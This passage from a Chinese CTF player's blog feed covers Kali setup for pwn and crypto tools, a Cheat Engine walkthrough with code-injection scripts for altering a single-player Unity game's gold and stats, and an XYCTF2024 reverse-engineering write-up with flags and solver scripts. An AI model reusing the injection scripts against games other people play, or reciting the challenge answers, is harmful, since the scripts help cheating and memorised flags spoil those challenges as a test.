src="https://s2.loli.net/2024/05/02/PGaHBt7Fr8IJisT.png" alt="image-20240502161037944"></p><p>表明成功</p><h4 id="安装sage-math">安装sage-math</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure><p>启动docker</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull sagemath/sagemath</span><br></pre></td></tr></table></figure><p>拉取镜像</p><p>最后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it sagemath/sagemath:latest</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/aDfsTwqE79OztFQ.png" alt="image-20240502161640136"></p><p>成功</p><p>由于sage的python好像模块不齐，还要配置模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p8888:8888 sagemath/sagemath:latest sage-jupyter</span><br></pre></td></tr></table></figure><p>打开交互式环境，点击最下面的链接</p><p><img src="https://s2.loli.net/2024/05/02/Sx1UzhFfamklsEg.png" alt="image-20240502163425729"></p><p>new - terminal</p><p>在这里pip install就好</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pycryptodome</span><br><span class="line">pip install crypto</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/Jnz4YKiud9GDBcI.png" alt="image-20240502164306991"></p><p>安装好了测试一下，在new中选择sagemath10.3</p><p><img src="https://s2.loli.net/2024/05/02/81NgP2YGifK3EDc.png" alt="image-20240502164335278"></p><h3 id="PWN环境配置">PWN环境配置</h3><h4 id="pwntool安装">pwntool安装</h4><p>因为是py库，用来写exp的</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install <span class="comment">--upgrade pwntools</span></span><br></pre></td></tr></table></figure><p>其实应该在本机安的，感觉方便一点</p><h4 id="pwndbg安装">pwndbg安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br></pre></td></tr></table></figure><p>然后</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><h4 id="插件安装">插件安装</h4><p>peda</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/longld/peda.git</span><br></pre></td></tr></table></figure><p>pwngdb</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/scwuaptx/Pwngdb.git </span><br></pre></td></tr></table></figure><p>由于正常情况插件不能一起使用？？所以要配置文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br><span class="line">sudo leafpad /.gdbinit</span><br></pre></td></tr></table></figure><p>在其中写入：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwndbg/g</span>dbinit.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/peda/</span>peda.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/pwngdb/</span>pwngdb.py</span><br><span class="line"><span class="keyword">source</span> ~<span class="regexp">/Pwngdb/</span>angelheap/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line"><span class="keyword">import</span> angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>注意目录必须和安装位置一样，上面的地址默认是在~目录下载的</p><p>然后</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb</span><br><span class="line"><span class="built_in">file</span> xxx</span><br><span class="line"><span class="built_in">start</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/05/02/jMg94u3cXY5wify.png" alt="image-20240502190833611"></p><p>成功</p><h3 id="MISC环境配置">MISC环境配置</h3><p>misc里面需要的东西有点杂，而且很多其实在windows里面都有代替，所以感觉没什么必要，但是保险起见（防止之后我作死），还是写一点</p><h4 id="foremost">foremost</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure><p>检查：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">foremost -h</span></span><br></pre></td></tr></table></figure><h4 id="binwalk">binwalk</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">cd binwalk</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><h4 id="ciphey">ciphey</h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt <span class="keyword">install</span> python3-ciphey</span><br></pre></td></tr></table></figure><p>差不多这几个工具吧（<s>弗如随波逐流</s>）</p><hr><p>之后应该也有更新QAQ</p><p>参考：</p><p><a href="https://www.cnblogs.com/huajianyizou/p/kali1.html#_label3">Kali下载安装以及基础配置 - 清光照归途 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/weixin_46318141/article/details/121168812">kali下对Docker的详细安装_kali安装docker-CSDN博客</a></p><p>[<a href="https://blog.csdn.net/qq_46145027/article/details/124912352">密码学]利用docker安装与使用sagemath_kali安装sagemath-CSDN博客</a></p><p><a href="https://blog.csdn.net/whbing1471/article/details/112410599">gdb与peda、pwngdb、pwndbg组合安装与使用_gdb peda-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 知识集 </category>
          
          <category> 环境配置 </category>
          
          <category> 记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CE与mono模块_1</title>
      <link href="/posts/b58030d5.html"/>
      <url>/posts/b58030d5.html</url>
      
        <content type="html"><![CDATA[<p>今天不想学习，想玩游戏，所以就打开了一个肉鸽游戏，尝试开挂。</p><p>参考：<a href="https://www.bilibili.com/read/cv12648903/">【CheatEngine基础教程】四、Unity3D游戏《晚上nano好》修改实战</a></p><hr><p>先打开游戏目录，看看是哪类游戏</p><ul><li>rpgmaker：解包+编辑器用工程文件打开</li><li>gamemaker：js反混淆得到源代码</li><li>unity il ：ce+dnspy</li><li>unity il2cpp：恢复符号表ida改cpp代码+ce</li></ul><p>在Managed文件夹中：</p><p><img src="https://s2.loli.net/2024/05/01/zCu6egoh4MGdD1b.png" alt="image-20240501224552961"></p><p>很明显可以看出是unity游戏</p><p>首先要明确目标：</p><p>这是一个卡牌rougelike游戏，玩家操作2~4个角色+一个主角打败复数的敌人</p><p>修改金钱，技能点（升级人物），人物血量，每回合费用</p><p>那么开始</p><hr><h2 id="修改基本数据">修改基本数据</h2><p>由于这个游戏是unity游戏，可以直接通过ce的mono分析模块来方便地检测内容并hook函数</p><p><img src="https://s2.loli.net/2024/05/01/WhaZ835mzOniIXE.png" alt="image-20240501232651548"></p><p>这样打开这个功能，然后搜索金钱数量，直到找到对应的值</p><p><img src="https://s2.loli.net/2024/05/01/VfbATiPKu9JMcIX.png" alt="image-20240501232847246"></p><p>右键，查找是什么改写了这个值</p><p>得到：</p><p><img src="https://s2.loli.net/2024/05/01/W3fw4BKvlXYamz9.png" alt="image-20240501233125213"></p><p>详细分析一下这个代码，会发现这里的地址是写死的，以字面量直接放到内容里面，这是为什么呢？</p><p>由于unity是cs语言，cs在编译时只生成il中间代码，在CLR虚拟机中执行，相当于java里面的虚拟机。这样，它边执行边编译，直接把对应的值写死在编译出的代码里面，然后直接执行，这样当然可以每次都使用字面量而每次都可以不一样。</p><p>这也说明不能通过找多级指针来寻找基址，需要另一种方法。</p><p>由于开启了mono分析功能，在检测界面点击：显示反汇编程序：</p><p><img src="https://s2.loli.net/2024/05/01/SDkHMu6Xsi4WBvK.png" alt="image-20240501233819497"></p><p>可以看到已经把函数名翻译出来了，那么我们可以从函数名下文章直接找值，由于函数名是一定的，从函数名开始的偏移也是一定的，这样就可以直接找到对应的变量而不需要找基址。可以看到这里的方法是金币的set方法</p><p>在dnspy中查看</p><p><img src="https://s2.loli.net/2024/05/01/rHcURCS4dVo8nwQ.png" alt="image-20240501234129448"></p><p>显然找get更好</p><p>在ce中ctrl+g跳转:PlayData:get_Gold</p><p>只有1c的长度</p><p><img src="https://s2.loli.net/2024/05/01/9tNqvX15Gkb26Wp.png" alt="image-20240501234429636"></p><p>可以直接从11行取出rax+25c作为gold的值，但是get和set在这里都有rax+25c的偏移，可以怀疑这里有一个结构体，如果可以找到结构体开始的值，相当于整个内容都有了，只不过还有解决每个值对应的内容是什么的问题。这时mono分析功能又派上用场了：</p><p>ctrl+d:</p><p>把我们金钱的地址填进去-结构-定义新的结构：</p><p>它把所有信息显示出来了（还有偏移量）：</p><p><img src="https://s2.loli.net/2024/05/01/yucfLIpWzjeVgK6.png" alt="image-20240501234828639"></p><p>一开始的值就是上面函数中的字面量，soul就是技能点，把这两个偏移记住</p><p>在内存查看中-工具-自动汇编-写自动汇编脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[ENABLE]</span><br><span class="line">&#123;$lua&#125;</span><br><span class="line">if syntaxcheck then return end</span><br><span class="line">if (LaunchMonoDataCollector()==0) then error(&quot;No Mono&quot;) end</span><br><span class="line">;判断mono功能是否开启</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aobscanregion(getGoldMethod,PlayData:get_Gold,PlayData:get_Gold+FF,48 B8)</span><br><span class="line">;取到对应函数对应位的对应值（结构体开始位置）</span><br><span class="line">alloc(Pridata,8)</span><br><span class="line">;生成标签，以标签开头的内容作为标签区域的代码，标签内容是可读可写可执行的</span><br><span class="line">registersymbol(Pridata)</span><br><span class="line">;把标签升为全局变量，可以在其它位置使用，比如制作指针的时候</span><br><span class="line">Pridata:</span><br><span class="line">readmem(getGoldMethod+2,8)</span><br><span class="line">;将对应位置写入全局变量</span><br><span class="line">[DISABLE]</span><br><span class="line">dealloc(Pridata)</span><br><span class="line">unregistersymbol(Pridata)</span><br></pre></td></tr></table></figure><p>这样我们保存后就保存了对应的结构体指针</p><p>然后根据偏移：</p><p><img src="https://s2.loli.net/2024/05/01/pix2qoOGMdzXTIL.png" alt="image-20240501235648619"></p><p>做出指针，后面的soul同理，不再赘述</p><p>在这个结构体中还有人物血量：</p><p>同理把找到的结构体开头作为基址来偏移就好</p><p><img src="https://s2.loli.net/2024/05/01/SOsnpq3f876uJy9.png" alt="image-20240501235927670"></p><p>最后还有cost，每回合费用，它不在这个结构体里面，重新搜索，如法炮制：</p><p>先看结构体偏移8c</p><p>找到setAP函数和getAP函数，这两个函数似乎都没有硬编码的地址，也比较合理，每次开一个战斗都要重新生成一次，但是可以看到：</p><p><img src="https://s2.loli.net/2024/05/02/GAPbXhqDOozjyxf.png" alt="image-20240502000544674"></p><p>明显结构体开头在r15，但是拿不到值，干脆直接注入代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">[Enable]</span><br><span class="line">&#123;$asm&#125;</span><br><span class="line">alloc(newmem,512,BattleTeam:SetAP+11d)</span><br><span class="line">label(returnhere)</span><br><span class="line">label(originalcode)</span><br><span class="line">label(exit)</span><br><span class="line">alloc(Battledata,8)</span><br><span class="line">registersymbol(Battledata);创建全局变量</span><br><span class="line">newmem:;插入获取的代码</span><br><span class="line">mov [Battledata],r15</span><br><span class="line">originalcode:;原来的代码</span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line"></span><br><span class="line">exit:</span><br><span class="line">jmp returnhere</span><br><span class="line"></span><br><span class="line">BattleTeam:SetAP+11d:;把目标地址改成跳转</span><br><span class="line">jmp newmem</span><br><span class="line">nop 2</span><br><span class="line">returnhere:</span><br><span class="line"></span><br><span class="line">[Disable]</span><br><span class="line">BattleTeam:SetAP+11d:;还原代码</span><br><span class="line">mov [r15+0000008C],edi</span><br><span class="line">dealloc(Battledata)</span><br><span class="line">dealloc(newmem)</span><br><span class="line"></span><br><span class="line">&#123;$asm&#125;</span><br></pre></td></tr></table></figure><p>这样就拿到结构体头了，不过因为是代码注入，必须要调用一次这个函数之后才可以得到值。</p><p>同理就得到AP的值了。</p><hr><h2 id="锁血和秒杀">锁血和秒杀</h2><hr><h2 id="角色信物">角色信物</h2><p>这个游戏有一个设定，解锁角色需要一些条件。然后如果想要看后日谈，需要解锁所有角色，然后用对应的礼物给对应的角色3次，并在最后打最终boss的时候带上他们并通关，这需要花费的时间太长了，很离谱，所以准备修改一下。</p><p>在dnspy中搜索角色数据，任意搜索一下，找到了一个用于返回这一个角色数据的函数：</p><p><img src="https://s2.loli.net/2024/05/06/sMQwtbKVmOk93EP.png" alt="image-20240506212320587"></p><p>通过这个查找被什么使用</p><p>找到给礼物的函数：</p><p><img src="https://s2.loli.net/2024/05/06/AkKPJTcZufQoRle.png" alt="image-20240506212840126"></p><p>这个函数表明可以通过charid来查找对应的charData</p>]]></content>
      
      
      <categories>
          
          <category> 实践 </category>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> CE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RE </tag>
            
            <tag> 游戏逆向 </tag>
            
            <tag> unity </tag>
            
            <tag> CE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF-r22题目复现</title>
      <link href="/posts/8a68bf71.html"/>
      <url>/posts/8a68bf71.html</url>
      
        <content type="html"><![CDATA[<p>2024/11/16：没写，算了</p>]]></content>
      
      
      <categories>
          
          <category> 题集 </category>
          
          <category> CTF </category>
          
          <category> 比赛 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XYCTF2024-wp</title>
      <link href="/posts/685012f7.html"/>
      <url>/posts/685012f7.html</url>
      
        <content type="html"><![CDATA[<p>能说什么呢，这题。。。难以言喻</p><hr><h2 id="RE">RE</h2><h3 id="week1">week1</h3><h4 id="DebugMe">DebugMe</h4><p>这个是安卓动态调试，之前遇到过一个类似的，但是不同的是，那个直接在模拟器里面调就可以，这次这个好像没有被jadx识别到。</p><p>然后学到了另外一种方法：</p><p>在jadx调试界面直接点击启动ADB服务，然后打开模拟器，点击刷新，就能看到所有进程，然后就可以调试了</p><p>这个时候点击按钮，出flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;d3bugg3r_15_v3ry_u53ful&#125;</span></span><br></pre></td></tr></table></figure><h4 id="你真的是大学生吗？">你真的是大学生吗？</h4><p>这个是一个16位dos程序，ida打开看汇编还原程序</p><p>加密逻辑：</p><p><img src="https://s2.loli.net/2024/04/06/OKsLR8WFtHxiI92.png" alt="image-20240406123918332"></p><p>相当于每次和下一位xor</p><p>之前没怎么搞懂mov si ，2F，然后发现是把它当地址。。没看明白add si,cx有什么用，可能add si,cx是创建一个空缓冲区存输入的。</p><p>加密逻辑确实是从最后开始向前异或，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = *p2;</span><br><span class="line">p2-=<span class="number">1</span>;</span><br><span class="line">*p2 ^= a;</span><br></pre></td></tr></table></figure><p>那直接逆向</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">a = [<span class="number">0x76</span>, <span class="number">0x0E</span>, <span class="number">0x77</span>, <span class="number">0x14</span>, <span class="number">0x60</span>, <span class="number">0x06</span>, <span class="number">0x7D</span>, <span class="number">0x04</span>, <span class="number">0x6B</span>, <span class="number">0x1E</span>, <span class="number">0x41</span>, <span class="number">0x2A</span>, <span class="number">0x44</span>, <span class="number">0x2B</span>, <span class="number">0x5C</span>, <span class="number">0x03</span>, <span class="number">0x3B</span>, <span class="number">0x0B</span>, <span class="number">0x33</span>, <span class="number">0x05</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    a[i]^=a[(i+<span class="number">1</span>)%<span class="built_in">len</span>(a)]</span><br><span class="line">pl(a)</span><br><span class="line"><span class="comment"># xyctf&#123;you_know_8086&#125;</span></span><br></pre></td></tr></table></figure><h4 id="喵喵的flag碎了一地">喵喵的flag碎了一地</h4><p>这个不用多说，直接跟着提示走就好</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="symbol">My_fl@</span><span class="symbol">g_h4s_br0ken_4parT_Bu7_Y0u_c@</span>n_f1x_1t!&#125;</span><br></pre></td></tr></table></figure><h4 id="聪明的信使">聪明的信使</h4><p>一眼凯撒加密，拿去爆破</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_KnOw_Crypt0_14_v3ry_Imp0rt@nt!&#125;</span><br></pre></td></tr></table></figure><p>偏移是9</p><h4 id="Trustme">Trustme</h4><p>解包之后感觉哪里不对，好像什么都没有，但是assets里面有一个mydb的文件，打开看看，全是0xff，异或一下试试，出来了QAQ</p><p>查一下知道这个是SQLite文件，用在线工具分析文件得到flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;And0r1d_15_V3ryEasy&#125;</span></span><br></pre></td></tr></table></figure><h4 id="Baby-Unity-ez-Unity">Baby Unity / ez Unity</h4><p>这两个的做法一模一样，唯一的区别是ez里面的dat文件头被修改了，先放flag，然后记录一下第一次遇到li2cpp的题</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">389</span>f6900-e12d-<span class="number">4</span>c54-a85d-<span class="number">64</span>a54af9f84c&#125;</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">XYCTF</span><span class="template-variable">&#123;IL2CPP_1s_intere5t1ng&#125;</span></span><br></pre></td></tr></table></figure><p>原理大概是这样：</p><p>unity的游戏输出有两种一种是mono的c#（一般逆的），这种一般在managed文件夹里有Assembly-CShap.dll文件，然后这个东西可以直接被dnspy之类的直接反编译。这次这种叫li2cpp（中间代码 to cpp）,通过失去动态编译特性来换取cpp的多平台，速度快等优势，对逆向来说：最恶心的就是文件变成了GameAssembly.dll，这是个PE文件（在移动端是so文件），也就是说符号表完全不必要有，这样就不好逆了（如果有佬可以直接逆的话，只能说NB），不过这个文件也没有常量表之类的东西所以肯定在一个地方存了它的数据来读入。</p><p>根据检索网络得知：符号表位于\il2cpp_data\Metadata\global-metadata.dat</p><p>现在的目的就是把这个文件导入进去了。</p><p>有一个工具叫做licppdumper可以做到这一点：</p><p>下载后双击exe，提示选择li2cpp二进制文件，选择GameAssembly.dll，又提示选择dat文件选择dat文件（baby那道题可以直接导入，ez那道题做了加密）</p><p>发现导入不了，去010看看结构：</p><p><img src="https://s2.loli.net/2024/04/06/cElIVup7XRNadnD.png" alt="错误的结构"></p><p><img src="https://s2.loli.net/2024/04/06/DjiS8cWGAzyf3U5.png" alt="正常的结构"></p><p>把第一排改成AF 1B B1 FA 1D 00 00 00 00 01 00 00，删几个字符，让后面接着C0 B2</p><p>然后把下面的内容对齐</p><p>直接dumper导入，导入成功！</p><p>然后打开ida，导入脚本文件，然后选择刚刚用dumper生成的两个json文件：</p><p>script.json和stringliteral.json文件，两个选择完之后,符号表就恢复了，然后在ida里面直接找加密函数，应该很好看，一个是RC4，一个是AES直接放到在线网站上解就好了，其中用到的数被还原成注释了，不要看错了QAQ</p><h3 id="week2">week2</h3><h4 id="ez-cube">ez_cube</h4><p>用ida反编译分析，找到打乱方式</p><p><img src="https://s2.loli.net/2024/04/09/21wu6gCdpSfPxc5.png" alt="image-20240409183514183"></p><p>百度搜索cfop pll可得公式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R <span class="string">U&#x27; R U R U R U&#x27;</span> <span class="string">R&#x27; U&#x27;</span> R2</span><br><span class="line">flag&#123;RuRURURuruRR&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-rand">ez_rand</h4><p>这个题就是考rand函数在不同环境下效果不同这个知识点，刚好我一开始就用的cpp，直接写脚本爆破出rand然后用就好了，还有注意传入初始化的值在al寄存器里面，所以要&amp;0xffff</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctime&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdlib&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> tstart = <span class="number">1640966400</span>;</span><br><span class="line">    <span class="type">long</span> tlast = <span class="number">1735660800</span>;</span><br><span class="line">    <span class="type">long</span> time = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> flag[<span class="number">29</span>] = &#123; <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span> &#125;;<span class="comment">/*&quot;XYCTF&#123;&quot;;*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">29</span>] = &#123;</span><br><span class="line">    <span class="number">0x5D</span>, <span class="number">0x0C</span>, <span class="number">0x6C</span>, <span class="number">0xEA</span>, <span class="number">0x46</span>, <span class="number">0x19</span>, <span class="number">0xFC</span>, <span class="number">0x34</span>, <span class="number">0xB2</span>, <span class="number">0x62</span>, <span class="number">0x23</span>, <span class="number">0x07</span>, <span class="number">0x62</span>, <span class="number">0x22</span>, <span class="number">0x6E</span>, <span class="number">0xFB</span>,</span><br><span class="line">    <span class="number">0xB4</span>, <span class="number">0xE8</span>, <span class="number">0xF2</span>, <span class="number">0xA9</span>, <span class="number">0x91</span>, <span class="number">0x12</span>, <span class="number">0x21</span>, <span class="number">0x86</span>, <span class="number">0xDB</span>, <span class="number">0x8E</span>, <span class="number">0xE9</span>, <span class="number">0x43</span>, <span class="number">0x4D</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//for (time = tstart; time &lt;= tlast; time++)</span></span><br><span class="line">    <span class="comment">//&#123;</span></span><br><span class="line">    <span class="comment">//    srand(time &amp; 0xffff);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    int f = 0;</span></span><br><span class="line">    <span class="comment">//    for (int i = 0; i &lt; 6; i++)</span></span><br><span class="line">    <span class="comment">//    &#123;</span></span><br><span class="line">    <span class="comment">//        int num = rand();</span></span><br><span class="line">    <span class="comment">//        if ((flag[i] ^ (unsigned __int8)(num + ((((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &amp; 0x80000000) != 0) + ((int)((unsigned __int64)(2155905153 * num) &gt;&gt; 32) &gt;&gt; 7))) == data[i])</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            f++;</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//        if (f &gt;= 6)</span></span><br><span class="line">    <span class="comment">//        &#123;</span></span><br><span class="line">    <span class="comment">//            printf(&quot;%d  &quot;, time &amp; 0xffff);</span></span><br><span class="line">    <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    //std::cout &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    time = <span class="number">21308</span>;</span><br><span class="line">    <span class="built_in">srand</span>(time);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">29</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> num = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> x = (<span class="type">unsigned</span> __int8)(num + ((((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0x80000000</span>) != <span class="number">0</span>) + ((<span class="type">int</span>)((<span class="type">unsigned</span> __int64)(<span class="number">2155905153</span> * num) &gt;&gt; <span class="number">32</span>) &gt;&gt; <span class="number">7</span>));</span><br><span class="line">        flag[i] = data[i] ^ x;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; flag;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span 